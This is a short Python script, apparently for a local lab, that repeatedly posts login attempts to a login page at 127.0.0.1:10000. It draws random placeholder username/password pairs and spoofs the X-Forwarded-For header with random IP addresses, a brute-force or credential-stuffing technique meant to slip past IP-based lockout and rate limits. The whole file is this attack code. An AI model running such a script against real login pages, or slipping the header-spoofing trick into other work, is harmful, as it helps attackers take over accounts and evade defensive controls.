import requests
import random

url = "http://127.0.0.1:10000/login.html"

# List of random IP addresses
ip_addresses = [
    "192.168.0.1",
    "10.0.0.1",
    "172.16.0.1",
    "127.0.0.1",
    "203.0.113.1",
    # Add more IP addresses as needed
]

# List of username and password combinations
credentials = [
    ("user1", "password1"),
    ("user2", "password2"),
    ("user3", "password3"),
    # Add more username and password combinations as needed
]

for _ in range(10):
    # Select a random IP address and credentials for each request
    ip_address = random.choice(ip_addresses)
    username, password = random.choice(credentials)

    # Create the request payload
    data = {
        "username": username,
        "password": password
    }

    # Set the headers with the random IP address
    headers = {
        "X-Forwarded-For": ip_address
    }

    # Send the POST request
    response = requests.post(url, data=data, headers=headers)

    # Print the response
    print(f"IP: {ip_address}, Username: {username}, Password: {password}")
    print()